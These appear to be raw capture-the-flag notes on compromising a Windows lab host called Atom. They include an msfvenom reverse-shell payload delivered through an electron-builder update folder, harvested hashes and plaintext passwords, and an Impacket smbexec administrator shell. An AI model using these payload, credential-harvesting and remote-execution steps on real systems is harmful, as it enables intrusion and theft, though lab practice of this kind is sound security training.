10.10.10.237

PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
443/tcp  open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
* check web
* check versions

135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
* windows 10
* smbclient

6379/tcp open  redis        syn-ack ttl 127 Redis key-value store
* check redis for cached values

Host script results:
|_clock-skew: mean: 2h20m44s, deviation: 4h02m29s, median: 43s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 8134/tcp): CLEAN (Timeout)
|   Check 2 (port 38781/tcp): CLEAN (Timeout)
|   Check 3 (port 39922/udp): CLEAN (Timeout)
|   Check 4 (port 25964/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-05-10T14:46:23-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-10T21:46:26
|_  start_date: N/A


# mount
> smbclient -L \\\\10.10.10.237\\ -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Software_Updates Disk

> mount -t cifs //10.10.10.237/Software_Updates targetshare/

Heedv1.0
Note taking application built with electron-builder which helps users in taking important notes.

Thereâ€™s no server interaction when creating notes. So
currently it just acts as a one-tier thick client application. We are planning to move it to a
full fledged two-tier architecture sometime in the future releases.

We follow the below process before releasing our products.
1. Build and install the application to make sure it works as we expect it to be.
2. Make sure that the update server running is in a private hardened instance. To initiate the QA process, just place the updates in one of the "client" folders, and] the appropriate QA team will test it to ensure it finds an update and installs it correctly.
3. Follow the checklist to see if all given features are working as expected by the developer.

* Potentially can create an application and get the QA team to execute it
    * what application should i build?
    * tried with a msfvenom generated payload, doesn't work

# redis
* Nothing found on redis server, all require auth. Try brute forcing redis credential, nothing found.

# web
* can download a zip file
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.

* subdomain enum
> gobuster -w ~/workspace/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt vhost -u http://atom.htb -o subdomain_atom.htb


# attack on the electron-builder
> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.x.x LPORT=4444 -f exe > shell-x86.exe
> # shasum -a 512 r\'shell-x86.exe | cut -d " " -f1 | xxd -r -p | base64 -w 0
Rs27oWKqBEMz4yhvI4gksAbKXNZS5qEbyQfvN3GWEQ7UD9cWPGeObCQ7MmZ41iy33ssATr/uv30LqcK+zZQAZQ==


> type user.txt


# pe
[+] Searching known files that can contain creds in home
[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
C:\Users\jason\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
C:\Users\jason\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der
C:\Users\jason\NTUSER.DAT

[+] Looking for documents --limit 100--
C:\Users\jason\Downloads\PortableKanban\User Guide.pdf

[+] Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    jason::ATOM:1122334455667788:8675bd87241a06ba684213fa30783754:0101000000000000aa2b91387d47d70167c9be72873b63d80000000008003000300000000000000000000000002000002e366b06684be4cb15b9ba13c3f07b73a665ab78e03a3cf76b13f76b2b0fee050a00100000000000000000000000000000000000090000000000000000000000

[+] Checking Credential manager
[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
[!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string
    Username:              ATOM\jason
    Password:               kidvscat_electron_@123

[+] Enumerating Named Pipes
Name                                                                                                 Sddl

eventlog                                                                                             O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
ROUTER                                                                                               O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
SearchTextHarvester                                                                                  O:SYG:SYD:P(D;;FA;;;NU)(D;;FA;;;BG)(A;;FR;;;IU)(A;;FA;;;SY)(A;;FA;;;BA)
vgauth-service                                                                                       O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)

[+] UAC Status
[?] If you are in the Administrators group check how to bypass the UAC https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#basic-uac-bypass-full-file-system-access
ConsentPromptBehaviorAdmin: 5 - PromptForNonWindowsBinaries
EnableLUA: 1
LocalAccountTokenFilterPolicy: 1
FilterAdministratorToken: 1
    [*] LocalAccountTokenFilterPolicy set to 1.
    [+] Any local account can be used for lateral movement.

[+] LSA Protection
[?] If enabled, a driver is needed to read LSASS memory (If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key) https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#lsa-protection
LSA Protection is not enabled

[+] Credentials Guard
[?] If enabled, a driver is needed to read LSASS memory https://book.hacktricks.xyz/windows/stealing-credentials/credentials-protections#credential-guard
CredentialGuard is not enabled
Virtualization Based Security Status:      Not enabled
Configured:                                False
Running:                                   False

[+] Searching hidden files or folders in C:\Users home (can be slow)
    C:\Users\All Users\ntuser.pol
    C:\Users\jason\AppData\Local\Temp\BITE0BD.tmp
    C:\Users\jason\AppData\Local\Packages\Windows.PurchaseDialog_cw5n1h2txyewy\Windows.PurchaseDialog_6.2.0.0_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG2
    C:\Users\jason\AppData\Local\Packages\Windows.PurchaseDialog_cw5n1h2txyewy\Windows.PurchaseDialog_6.2.0.0_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG1
    C:\Users\jason\AppData\Local\Packages\Windows.ContactSupport_cw5n1h2txyewy\Windows.ContactSupport_10.0.10240.16384_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG2
    C:\Users\jason\AppData\Local\Packages\Windows.ContactSupport_cw5n1h2txyewy\Windows.ContactSupport_10.0.10240.16384_neutral_neutral_cw5n1h2txyewy\ActivationStore\ActivationStore.dat.LOG1

[+] Searching known files that can contain creds in home
[?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
C:\Users\jason\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlskey.der
C:\Users\jason\AppData\Local\Packages\Microsoft.SkypeApp_kzf8qxf38zg5c\LocalState\dtlscert.der

[+] Scheduled Applications --Non Microsoft--
[?] Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
(ATOM\Administrator) SoftwareUpdates: C:\Users\jason\appdata\roaming\cache\run.bat 
Permissions file: jason [WriteData/CreateFiles AllAccess]
Permissions folder(DLL Hijacking): jason [WriteData/CreateFiles AllAccess]
Trigger: At log on of ATOM\jason

(ATOM\Administrator) UpdateServer: C:\Users\jason\appdata\roaming\cache\http-server.bat 
Permissions file: jason [WriteData/CreateFiles AllAccess]
Permissions folder(DLL Hijacking): jason [WriteData/CreateFiles AllAccess]
Trigger: At log on of ATOM\jason

> type "C:\Program Files\Redis\redis.windows-service.conf"
requirepass `kidvscat_yes_kidvscat`

10.10.10.237:6379> get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
"{\"Id\":\"e8e29158d70d44b1a1ba4949d52790a0\",\"Name\":\"Administrator\",\"Initials\":\"\",\"Email\":\"\",\"EncryptedPassword\":\"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\",\"Role\":\"Admin\",\"Inactive\":false,\"TimeStamp\":637530169606440253}"

`Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi`

`kidvscat_admin_@123`


> python3 /root/.local/pipx/venvs/crackmapexec/bin/smbexec.py Administrator:kidvscat_admin_@123@10.10.10.237
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\WINDOWS\system32>cd ../..
[-] You can't CD under SMBEXEC. Use full paths.
C:\WINDOWS\system32>cd ..
[-] You can't CD under SMBEXEC. Use full paths.
C:\WINDOWS\system32>cd :\
[-] You can't CD under SMBEXEC. Use full paths.
C:\WINDOWS\system32>cd C:\
[-] You can't CD under SMBEXEC. Use full paths.


C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\root.txt

